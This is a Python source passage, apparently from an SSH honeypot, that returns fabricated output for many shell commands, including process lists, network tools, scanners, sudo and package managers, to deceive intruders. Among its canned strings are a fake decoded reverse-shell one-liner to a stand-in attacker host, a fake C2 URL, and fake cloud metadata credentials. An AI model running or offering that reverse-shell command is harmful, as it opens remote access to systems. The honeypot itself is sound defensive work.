    # ── process info ──────────────────────────────────────────────────────────
    if base == "ps":
        flags = " ".join(parts[1:])
        if "aux" in flags or "-aux" in flags or "-ef" in flags:
            return _write_redirect(
                "USER       PID %CPU %MEM    VSZ   RSS TTY      "
                "STAT START   TIME COMMAND\n"
                "root         1  0.0  0.1 168936 13456 ?        "
                "Ss   Jan14   0:02 /sbin/init\n"
                "root       423  0.0  0.0  72312  7168 ?        "
                "Ss   Jan14   0:00 /usr/sbin/sshd -D\n"
                "root       891  0.0  0.0  14996  3456 ?        "
                "Ss   Jan14   0:00 /usr/sbin/cron\n"
                "www-data   912  0.0  0.2 334512 18432 ?        "
                "Ss   Jan14   0:00 /usr/sbin/apache2\n"
                "mysql      934  0.2  2.1 1245678 174320 ?      "
                "Ssl  Jan14   2:34 /usr/sbin/mysqld\n"
                "root      1337  0.0  0.0  14996  3200 pts/0    "
                "Ss   09:12   0:00 -bash\n"
                "root      1338  0.0  0.0  11456  1234 pts/0    "
                "R+   09:12   0:00 ps aux"
            )
        return _write_redirect(
            "  PID TTY          TIME CMD\n"
            "    1 ?        00:00:02 init\n"
            "  423 ?        00:00:00 sshd\n"
            " 1337 pts/0    00:00:00 bash\n"
            " 1338 pts/0    00:00:00 ps"
        )

    if base == "top":
        return _write_redirect(
            "top - 14:32:01 up 47 days,  3:12,  1 user,  "
            "load average: 0.08, 0.03, 0.01\n"
            "Tasks:  98 total,   1 running,  97 sleeping,   "
            "0 stopped,   0 zombie\n"
            "%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.5 id,  "
            "0.0 wa,  0.0 hi,  0.1 si\n"
            "MiB Mem :   7826.8 total,    234.5 free,   "
            "2345.6 used,   5246.7 buff/cache\n"
            "MiB Swap:   2048.0 total,   2048.0 free,      "
            "0.0 used.   5120.2 avail Mem\n\n"
            "  PID USER      PR  NI    VIRT    RES    SHR S "
            " %CPU  %MEM     TIME+ COMMAND\n"
            "  934 mysql     20   0 1245678 174320  12345 S "
            "  0.3   2.2   2:34.56 mysqld\n"
            "    1 root      20   0  168936  13456   8320 S "
            "  0.0   0.2   0:02.41 systemd\n"
            "  423 root      20   0   72312   7168   6144 S "
            "  0.0   0.1   0:00.08 sshd\n"
            " 1337 root      20   0   14996   3200   2560 S "
            "  0.0   0.0   0:00.01 bash"
        )

    if base == "htop":
        return _write_redirect("[htop - requires interactive terminal]")

    if base == "kill":
        if len(parts) > 1:
            return ""
        return "kill: usage: kill [-s sigspec | -n signum | -sigspec] pid"

    if base in ("killall", "pkill"):
        return ""

    # ── network ───────────────────────────────────────────────────────────────
    if base == "ifconfig":
        return _write_redirect(
            "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
            "      inet 10.0.2.15  netmask 255.255.255.0  "
            "broadcast 10.0.2.255\n"
            "      inet6 fe80::a00:27ff:fe4b:c39a  prefixlen 64  "
            "scopeid 0x20<link>\n"
            "      ether 08:00:27:4b:c3:9a  txqueuelen 1000  (Ethernet)\n"
            "      RX packets 12453  bytes 9876543 (9.8 MB)\n"
            "      TX packets 8234   bytes 5678901 (5.6 MB)\n\n"
            "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n"
            "      inet 127.0.0.1  netmask 255.0.0.0\n"
            "      inet6 ::1  prefixlen 128  scopeid 0x10<host>\n"
            "      loop  txqueuelen 1000  (Local Loopback)\n"
        )

    if base == "ip":
        sub = parts[1] if len(parts) > 1 else ""
        if sub in ("addr", "a", "address"):
            return _write_redirect(
                "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue "
                "state UNKNOWN group default qlen 1000\n"
                "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
                "    inet 127.0.0.1/8 scope host lo\n\n"
                "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 "
                "qdisc fq_codel state UP group default qlen 1000\n"
                "    link/ether 08:00:27:4b:c3:9a brd ff:ff:ff:ff:ff:ff\n"
                "    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n"
            )
        if sub in ("route", "r"):
            return _write_redirect(
                "default via 10.0.2.1 dev eth0 proto dhcp src 10.0.2.15 "
                "metric 100\n"
                "10.0.2.0/24 dev eth0 proto kernel scope link "
                "src 10.0.2.15\n"
            )
        if sub in ("link", "l"):
            return _write_redirect(
                "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue "
                "state UNKNOWN mode DEFAULT group default qlen 1000\n"
                "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
                "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 "
                "qdisc fq_codel state UP mode DEFAULT group default "
                "qlen 1000\n"
                "    link/ether 08:00:27:4b:c3:9a brd ff:ff:ff:ff:ff:ff\n"
            )
        return _write_redirect("")

    if base in ("netstat", "ss"):
        flags = " ".join(parts[1:])
        if any(f in flags for f in ["-tulpn", "-tlnp", "-anp", "-an"]):
            return _write_redirect(
                "Active Internet connections (servers and established)\n"
                "Proto Recv-Q Send-Q Local Address           "
                "Foreign Address         State       PID/Program name\n"
                "tcp        0      0 0.0.0.0:22              "
                "0.0.0.0:*               LISTEN      423/sshd\n"
                "tcp        0      0 0.0.0.0:80              "
                "0.0.0.0:*               LISTEN      912/apache2\n"
                "tcp        0      0 127.0.0.1:3306          "
                "0.0.0.0:*               LISTEN      934/mysqld\n"
                "tcp        0      0 10.0.2.15:22            "
                "10.0.2.2:54321          ESTABLISHED 1337/sshd\n"
                "tcp6       0      0 :::80                   "
                ":::*                    LISTEN      912/apache2\n"
            )
        return _write_redirect(
            "Active Internet connections\n"
            "Proto Recv-Q Send-Q Local Address    Foreign Address  State\n"
            "tcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN\n"
            "tcp        0      0 0.0.0.0:80       0.0.0.0:*        LISTEN\n"
        )

    if base == "ping":
        if len(parts) < 2:
            return "ping: usage error: Destination address required"
        host = parts[-1]
        if "-c" not in parts:
            return (
                f"PING {host} ({host}): 56 data bytes\n"
                "[Press Ctrl+C to stop]"
            )
        count = 4
        if "-c" in parts:
            idx = parts.index("-c")
            try:
                count = int(parts[idx + 1])
            except Exception:
                pass
        rtt = round(random.uniform(0.5, 50.0), 3)
        lines = [f"PING {host} ({host}): 56 data bytes"]
        for i in range(min(count, 4)):
            lines.append(
                f"64 bytes from {host}: icmp_seq={i} ttl=64 "
                f"time={round(rtt + random.uniform(-0.1, 0.5), 3)} ms"
            )
        lines.append(
            f"\n--- {host} ping statistics ---\n"
            f"{count} packets transmitted, {count} received, "
            f"0% packet loss, time {count * 1000}ms\n"
            f"rtt min/avg/max/mdev = {rtt}/{rtt}/{rtt}/0.000 ms"
        )
        return _write_redirect("\n".join(lines))

    if base in ("traceroute", "tracepath"):
        host = parts[-1] if len(parts) > 1 else "unknown"
        return _write_redirect(
            f"traceroute to {host} ({host}), 30 hops max, 60 byte packets\n"
            " 1  10.0.2.1 (10.0.2.1)  0.532 ms  0.423 ms  0.387 ms\n"
            " 2  192.168.1.1 (192.168.1.1)  2.341 ms  2.234 ms  2.189 ms\n"
            " 3  * * *\n"
            " 4  * * *"
        )

    if base in ("dig", "nslookup", "host"):
        host = parts[-1] if len(parts) > 1 else "localhost"
        return _write_redirect(
            f"\n; <<>> DiG 9.18.12 <<>> {host}\n"
            f";; ANSWER SECTION:\n"
            f"{host}.\t\t300\tIN\tA\t"
            f"{random.randint(1,255)}.{random.randint(1,255)}."
            f"{random.randint(1,255)}.{random.randint(1,255)}\n"
        )

    if base == "route":
        return _write_redirect(
            "Kernel IP routing table\n"
            "Destination     Gateway         Genmask         Flags Metric "
            "Ref    Use Iface\n"
            "0.0.0.0         10.0.2.1        0.0.0.0         UG    100    "
            "0        0 eth0\n"
            "10.0.2.0        0.0.0.0         255.255.255.0   U     100    "
            "0        0 eth0\n"
        )

    if base == "arp":
        return _write_redirect(
            "Address                  HWtype  HWaddress           "
            "Flags Mask            Iface\n"
            "10.0.2.1                 ether   52:54:00:12:34:56   "
            "C                     eth0\n"
        )

    # ── disk / mounts ─────────────────────────────────────────────────────────
    if base == "df":
        return _write_redirect(
            "Filesystem      Size  Used Avail Use% Mounted on\n"
            "/dev/xvda1       20G   8.2G   11G  43% /\n"
            "tmpfs           3.9G     0  3.9G   0% /dev/shm\n"
            "/dev/xvdb        50G   22G   26G  46% /data\n"
            "tmpfs           5.0M  4.0K  5.0M   1% /run/lock\n"
        )

    if base == "lsblk":
        return _write_redirect(
            "NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\n"
            "xvda    202:0    0   20G  0 disk\n"
            "└─xvda1 202:1    0   20G  0 part /\n"
            "xvdb    202:16   0   50G  0 disk /data\n"
        )

    if base == "mount":
        return _write_redirect(
            "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n"
            "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n"
            "/dev/xvda1 on / type ext4 (rw,relatime,errors=remount-ro)\n"
            "/dev/xvdb on /data type ext4 (rw,relatime)\n"
            "tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)\n"
        )

    if base == "free":
        return _write_redirect(
            "              total        used        free      shared  "
            "buff/cache   available\n"
            "Mem:        8013312     2345678      234560        1024"
            "     5433074     5246196\n"
            "Swap:       2097148           0     2097148\n"
        )

    # ── download / transfer ───────────────────────────────────────────────────
    if base in ("wget", "curl"):
        url = next(
            (p for p in parts[1:] if not p.startswith("-")), ""
        )
        host = url.split("/")[2] if "//" in url else url
        fname = url.split("/")[-1] if "/" in url else "index.html"

        # AWS metadata endpoint — simulate cloud env for realism
        if "169.254.169.254" in url or "metadata" in url:
            if "iam" in url or "credentials" in url:
                return _write_redirect(
                    '{\n'
                    '  "Code": "Success",\n'
                    '  "Type": "AWS-HMAC",\n'
                    '  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",\n'
                    '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/'
                    'bPxRfiCYEXAMPLEKEY",\n'
                    '  "Token": "AQoDYXdzEJr...",\n'
                    '  "Expiration": "2024-01-15T18:00:00Z"\n'
                    '}'
                )
            return _write_redirect(
                '{"accountId":"123456789012","instanceId":"i-0abc123def",'
                '"region":"eu-west-1","instanceType":"t3.micro"}'
            )

        # simulate failed download (no internet from honeypot)
        if base == "curl":
            if "-s" in parts or "--silent" in parts:
                return ""
            return _write_redirect(
                f"curl: (6) Could not resolve host: {host}"
            )
        return _write_redirect(
            f"--2024-01-15 14:32:01--  {url}\n"
            f"Resolving {host}... failed: "
            "Name or service not known.\n"
            f"wget: unable to resolve host address '{host}'"
        )

    if base == "scp":
        return _write_redirect(
            "scp: Connection closed"
        )

    if base == "nc" or base == "netcat" or base == "ncat":
        host = parts[-2] if len(parts) >= 3 else ""
        port = parts[-1] if len(parts) >= 2 else ""
        return _write_redirect(
            f"Ncat: Connection refused."
        )

    if base == "socat":
        return _write_redirect("socat: address is not connected")

    # ── encoding / obfuscation ────────────────────────────────────────────────
    if base == "base64":
        if "-d" in parts or "--decode" in parts:
            # return a fake decoded payload
            return _write_redirect(
                "#!/bin/bash\n"
                "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
            )
        text = " ".join(
            p for p in parts[1:] if not p.startswith("-")
        )
        import base64 as b64
        return _write_redirect(
            b64.b64encode(text.encode()).decode() if text
            else "aGVsbG8gd29ybGQ="
        )

    if base == "xxd":
        return _write_redirect(
            "00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............\n"
            "00000010: 0200 3e00 0100 0000 7010 4000 0000 0000  ..>.....p.@.....\n"
        )

    if base == "strings":
        path = session.resolve_path(parts[-1]) if len(parts) > 1 else ""
        return _write_redirect(
            "/lib64/ld-linux-x86-64.so.2\n"
            "libz.so.1\nlibc.so.6\n"
            "__gmon_start__\n_ITM_deregisterTMCloneTable\n"
            "GLIBC_2.14\nGLIBC_2.2.5\n"
            "http://malicious-c2.com/update\n"
            "/bin/sh\nexecve\n"
        )

    # ── scanning / enumeration ────────────────────────────────────────────────
    if base in ("nmap", "masscan"):
        target = next(
            (p for p in parts[1:] if not p.startswith("-")), "localhost"
        )
        return _write_redirect(
            f"Starting {base} 7.94 ( https://nmap.org )\n"
            f"Nmap scan report for {target}\n"
            f"Host is up (0.0023s latency).\n\n"
            "PORT     STATE SERVICE VERSION\n"
            "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu\n"
            "80/tcp   open  http    Apache httpd 2.4.52\n"
            "3306/tcp open  mysql   MySQL 8.0.32\n"
            "8080/tcp open  http    nginx 1.18.0\n\n"
            f"Nmap done: 1 IP address (1 host up) scanned"
        )

    if base == "lsof":
        flags = " ".join(parts[1:])
        return _write_redirect(
            "COMMAND    PID     USER   FD   TYPE  DEVICE SIZE/OFF    NODE NAME\n"
            "systemd      1     root  cwd    DIR   253,1     4096       2 /\n"
            "sshd       423     root    3u  IPv4   12345      0t0     TCP *:22 (LISTEN)\n"
            "apache2    912 www-data    4u  IPv4   23456      0t0     TCP *:80 (LISTEN)\n"
            "mysqld     934    mysql    0u  IPv4   34567      0t0     TCP 127.0.0.1:3306 (LISTEN)\n"
            "bash      1337     root  cwd    DIR   253,1     4096 1234567 /root\n"
        )

    if base == "tcpdump":
        return _write_redirect(
            "tcpdump: verbose output suppressed, use -v or -vv for full "
            "protocol decode\n"
            "listening on eth0, link-type EN10MB (Ethernet), "
            "snapshot length 262144 bytes\n"
            "14:32:01.123456 IP 10.0.2.2.54321 > ubuntu-server.22: "
            "Flags [P.], seq 1:49\n"
            "14:32:01.234567 IP ubuntu-server.22 > 10.0.2.2.54321: "
            "Flags [.], ack 49\n"
            "^C\n2 packets captured\n2 packets received by filter\n"
            "0 packets dropped by kernel"
        )

    if base == "strace":
        cmd = " ".join(parts[1:])
        return _write_redirect(
            f"execve(\"{cmd.split()[0] if cmd else '/bin/ls'}\", "
            f"[\"{cmd}\"], envp) = 0\n"
            "brk(NULL)                               = 0x55c3f2345000\n"
            "mmap(NULL, 8192, PROT_READ|PROT_WRITE, "
            "MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1234567000\n"
            "exit_group(0)                           = ?\n"
            "+++ exited with 0 +++"
        )

    # ── persistence / privilege ───────────────────────────────────────────────
    if base == "crontab":
        if "-l" in parts:
            return _write_redirect(
                "# m h  dom mon dow   command\n"
                "*/5 * * * * /opt/scripts/monitor.sh >> /var/log/monitor.log 2>&1\n"
                "0 2 * * * /opt/scripts/backup.sh\n"
            )
        if "-e" in parts:
            return _write_redirect("")
        if "-r" in parts:
            return _write_redirect("")
        return _write_redirect(
            f"crontab: {parts[1] if len(parts) > 1 else ''}: "
            "command not found"
        )

    if base == "useradd":
        uname = next(
            (p for p in parts[1:] if not p.startswith("-")), "newuser"
        )
        return _write_redirect(
            f"useradd: user '{uname}' already exists"
        )

    if base == "userdel":
        return _write_redirect("")

    if base == "usermod":
        return _write_redirect("")

    if base == "groupadd":
        return _write_redirect("")

    if base == "passwd":
        if len(parts) > 1 and not parts[1].startswith("-"):
            return _write_redirect(
                f"Changing password for {parts[1]}.\n"
                "New password: \n"
                "Retype new password: \n"
                f"passwd: password updated successfully"
            )
        return _write_redirect(
            "New password: \n"
            "Retype new password: \n"
            "passwd: password updated successfully"
        )

    if base in ("sudo", "su"):
        if len(parts) > 1 and parts[1] == "-l":
            return _write_redirect(
                f"Matching Defaults entries for {USERNAME} on ubuntu-server:\n"
                "    env_reset, mail_badpass\n\n"
                f"User {USERNAME} may run the following commands:\n"
                f"    (ALL : ALL) ALL"
            )
        if base == "sudo" and len(parts) > 1:
            sub = " ".join(parts[1:])
            return handle_command(sub, session)
        return _write_redirect(
            f"[sudo] password for {USERNAME}: \n"
            "Sorry, try again."
        )

    if base == "visudo":
        return _write_redirect(
            "visudo: /etc/sudoers: permission denied"
        )

    # ── firewall ──────────────────────────────────────────────────────────────
    if base == "iptables":
        if "-L" in parts or "--list" in parts:
            return _write_redirect(
                "Chain INPUT (policy ACCEPT)\n"
                "target     prot opt source          destination\n"
                "ACCEPT     tcp  --  anywhere        anywhere  tcp dpt:ssh\n"
                "ACCEPT     tcp  --  anywhere        anywhere  tcp dpt:http\n\n"
                "Chain FORWARD (policy DROP)\n"
                "target     prot opt source          destination\n\n"
                "Chain OUTPUT (policy ACCEPT)\n"
                "target     prot opt source          destination\n"
            )
        if "-F" in parts or "--flush" in parts:
            return _write_redirect("")
        if "-A" in parts or "-D" in parts or "-I" in parts:
            return _write_redirect("")
        return _write_redirect("")

    if base == "ufw":
        if "status" in parts:
            return _write_redirect(
                "Status: active\n\n"
                "To                         Action      From\n"
                "--                         ------      ----\n"
                "22/tcp                     ALLOW IN    Anywhere\n"
                "80/tcp                     ALLOW IN    Anywhere\n"
                "443/tcp                    ALLOW IN    Anywhere\n"
            )
        return _write_redirect("Firewall not enabled (skipping reload)")

    # ── service management ────────────────────────────────────────────────────
    if base == "systemctl":
        sub = parts[1] if len(parts) > 1 else ""
        svc = parts[2] if len(parts) > 2 else ""
        if sub == "status":
            return _write_redirect(
                f"● {svc or 'sshd'}.service - OpenBSD Secure Shell server\n"
                f"     Loaded: loaded (/lib/systemd/system/{svc or 'sshd'}"
                ".service; enabled)\n"
                "     Active: active (running) since Mon 2024-01-15 09:12:01 "
                "UTC; 5h 20min ago\n"
                "   Main PID: 423 (sshd)\n"
                "      Tasks: 1 (limit: 4915)\n"
                "     Memory: 5.2M\n"
            )
        if sub in ("start", "stop", "restart", "enable", "disable"):
            return _write_redirect("")
        if sub == "list-units":
            return _write_redirect(
                "UNIT                          LOAD   ACTIVE SUB     "
                "DESCRIPTION\n"
                "sshd.service                  loaded active running "
                "OpenSSH server daemon\n"
                "apache2.service               loaded active running "
                "The Apache HTTP Server\n"
                "mysql.service                 loaded active running "
                "MySQL Community Server\n"
                "cron.service                  loaded active running "
                "Regular background program\n"
            )
        return _write_redirect("")

    if base == "service":
        return _write_redirect("")

    # ── interpreters ──────────────────────────────────────────────────────────
    if base in ("python", "python3"):
        if len(parts) > 1 and parts[1] == "-c":
            code = " ".join(parts[2:]).strip("\"'")
            if "os.system" in code or "subprocess" in code:
                return _write_redirect("")
            if "socket" in code:
                return _write_redirect(
                    "Traceback (most recent call last):\n"
                    "  File \"<string>\", line 1, in <module>\n"
                    "ConnectionRefusedError: [Errno 111] Connection refused"
                )
            if "import" in code:
                return _write_redirect("")
            return _write_redirect("")
        if len(parts) > 1 and not parts[1].startswith("-"):
            return _write_redirect(
                f"Traceback (most recent call last):\n"
                f"  File \"{parts[1]}\", line 1, in <module>\n"
                f"ModuleNotFoundError: No module named 'requests'"
            )
        return _write_redirect(
            "Python 3.10.12 (main, Nov 20 2023, 15:14:05) "
            "[GCC 11.4.0] on linux\n"
            "Type \"help\", \"copyright\", \"credits\" or "
            "\"license\" for more information.\n"
            ">>>"
        )

    if base == "perl":
        if "-e" in parts:
            return _write_redirect("")
        return _write_redirect("")

    if base == "ruby":
        return _write_redirect("")

    if base == "gcc":
        return _write_redirect(
            "gcc: error: no input files\n"
            "gcc: fatal error: no input files\n"
            "compilation terminated."
        )

    if base == "make":
        return _write_redirect(
            "make: *** No targets specified and no makefile found.  Stop."
        )

    if base == "git":
        sub = parts[1] if len(parts) > 1 else ""
        if sub == "clone":
            return _write_redirect(
                "Cloning into 'repo'...\n"
                "fatal: unable to connect to github.com:\n"
                "github.com[0: 140.82.121.4]: errno=Connection refused"
            )
        if sub == "status":
            return _write_redirect(
                "On branch main\n"
                "nothing to commit, working tree clean"
            )
        return _write_redirect(f"git: '{sub}' is not a git command")

    # ── package management ────────────────────────────────────────────────────
    if base in ("apt", "apt-get"):
        sub = parts[1] if len(parts) > 1 else ""
        if sub in ("install", "update", "upgrade", "remove"):
            return _write_redirect(
                "E: Could not open lock file "
                "/var/lib/dpkg/lock-frontend - open (11: Resource "
                "temporarily unavailable)\n"
                "E: Unable to acquire the dpkg frontend lock "
                "(/var/lib/dpkg/lock-frontend), is another process "
                "using it?"
            )
        if sub in ("list", "search"):
            return _write_redirect("")
        return _write_redirect(
            "E: Could not open lock file "
            "/var/lib/dpkg/lock-frontend - open (13: Permission denied)"
        )

    if base in ("yum", "dnf"):
        return _write_redirect(
            "Error: Failed to download metadata for repo 'base': "
            "Cannot prepare internal mirrorlist: No URLs in mirrorlist"
        )

    if base in ("pip", "pip3"):
        pkg = next(
            (p for p in parts[1:] if not p.startswith("-")), ""
        )
        if parts[1] if len(parts) > 1 else "" == "install":
            return _write_redirect(
                f"Collecting {pkg}\n"
                f"  Could not find a version that satisfies the "
                f"requirement {pkg}\n"
                f"No matching distribution found for {pkg}"
            )
        return _write_redirect("")

    # ── history ───────────────────────────────────────────────────────────────
    if base == "history":
        if not session.history:
            return _write_redirect("")
        lines = []
        for i, cmd in enumerate(session.history, 1):
            lines.append(f"  {i:3}  {cmd}")
        return _write_redirect("\n".join(lines))

    if base == "alias":
        return _write_redirect(
            "alias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n"
            "alias grep='grep --color=auto'"
        )

    # ── misc system ───────────────────────────────────────────────────────────
    if base == "dmesg":
        return _write_redirect(
            "[    0.000000] Linux version 5.15.0-91-generic\n"
            "[    0.000000] Command line: BOOT_IMAGE=/vmlinuz\n"
            "[    1.234567] eth0: renamed from veth1234abc\n"
            "[12345.678901] connection from 10.0.2.2 port 54321\n"
        )

    if base == "journalctl":
        return _write_redirect(
            "-- Logs begin at Mon 2024-01-15 00:00:01 UTC --\n"
            "Jan 15 09:12:01 ubuntu-server sshd[423]: "
            "Accepted password for root from 10.0.2.2 port 54321 ssh2\n"
            "Jan 15 09:12:01 ubuntu-server sshd[423]: "
            "pam_unix(sshd:session): session opened for user root\n"
        )

    if base == "fdisk":
        if "-l" in parts:
            return _write_redirect(
                "Disk /dev/xvda: 20 GiB, 21474836480 bytes, 41943040 sectors\n"
                "Device     Boot Start      End  Sectors Size Id Type\n"
                "/dev/xvda1       2048 41943006 41940959  20G 83 Linux\n\n"
                "Disk /dev/xvdb: 50 GiB, 53687091200 bytes\n"
                "/dev/xvdb1       2048 104855551 104853504  50G 83 Linux\n"
            )
        return _write_redirect("")

    if base == "sysctl":
        if "-a" in parts:
            return _write_redirect(
                "kernel.hostname = ubuntu-server\n"
                "kernel.ostype = Linux\n"
                "kernel.osrelease = 5.15.0-91-generic\n"
                "net.ipv4.ip_forward = 0\n"
                "net.ipv4.tcp_syncookies = 1\n"
                "vm.swappiness = 60\n"
            )
        return _write_redirect("")

    if base == "modprobe":
        return _write_redirect("")

    if base == "lsmod":
        return _write_redirect(
            "Module                  Size  Used by\n"
            "nf_conntrack          163840  1 nf_nat\n"
            "nf_nat                 65536  1 iptable_nat\n"
            "iptable_nat            16384  1\n"
            "xt_MASQUERADE          20480  1\n"
        )

    if base in ("reboot", "shutdown", "halt", "poweroff"):
        return _write_redirect(
            "Failed to set wall message, ignoring: "
            "Interactive authentication required.\n"
            "Failed to call ScheduleShutdown in logind, "
            "proceeding with immediate shutdown: "
            "Interactive authentication required."
        )

    if base == "screen":
        return _write_redirect("[screen requires interactive terminal]")

    if base == "tmux":
        return _write_redirect("[tmux requires interactive terminal]")

    if base in ("vim", "vi", "nano", "emacs"):
        return _write_redirect(
            f"[{base}: requires interactive terminal — "
            "use cat to read files]"
        )

    if base == "man":
        topic = parts[1] if len(parts) > 1 else ""
        return _write_redirect(
            f"No manual entry for {topic}"
            if topic else "What manual page do you want?"
        )

    if base == "which":
        if len(parts) < 2:
            return ""
        results = []
        for t in parts[1:]:
            path = _WHICH_MAP.get(t)
            results.append(path if path else f"which: no {t} in PATH")
        return _write_redirect("\n".join(results))

    if base == "type":
        if len(parts) < 2:
            return ""
        t = parts[1]
        path = _WHICH_MAP.get(t)
        if path:
            return _write_redirect(f"{t} is {path}")
        return _write_redirect(f"bash: type: {t}: not found")

    if base == "whereis":
        t = parts[1] if len(parts) > 1 else ""
        path = _WHICH_MAP.get(t, "")
        return _write_redirect(
            f"{t}: {path} /usr/share/man/man1/{t}.1.gz" if path
            else f"{t}:"
        )

    if base == "true":
        return ""

    if base == "false":
        return ""

    if base == "sleep":
        return ""

    if base in ("test", "["):
        return ""

    if base == "read":
        return ""

    if base == "set":
        return _write_redirect(
            "\n".join(f"{k}={v}" for k, v in session.env.items())
        )

    if base == "source" or base == ".":
        return ""

    if base == "nohup":
        if len(parts) > 1:
            return handle_command(" ".join(parts[1:]), session)
        return ""

    if base == "watch":
        if len(parts) > 1:
            return handle_command(" ".join(parts[1:]), session)
        return ""

    if base in ("time",):
        if len(parts) > 1:
            out = handle_command(" ".join(parts[1:]), session)
            return (
                f"{out}\n\nreal\t0m0.012s\nuser\t0m0.008s\nsys\t0m0.004s"
            )
        return ""

    if base == "xargs":
        return ""

    if base == "ssh":
        host = next(
            (p for p in parts[1:] if not p.startswith("-")), ""
        )
        return _write_redirect(
            f"ssh: connect to host {host} port 22: Connection refused"
        )

    if base in ("cmp", "diff"):
        return _write_redirect("")

    if base == "cut":
        return _write_redirect("")

    if base == "tr":
        return _write_redirect("")

    if base == "head":
        return _write_redirect("")

    # ── fallback ──────────────────────────────────────────────────────────────
    return f"bash: {base}: command not found"
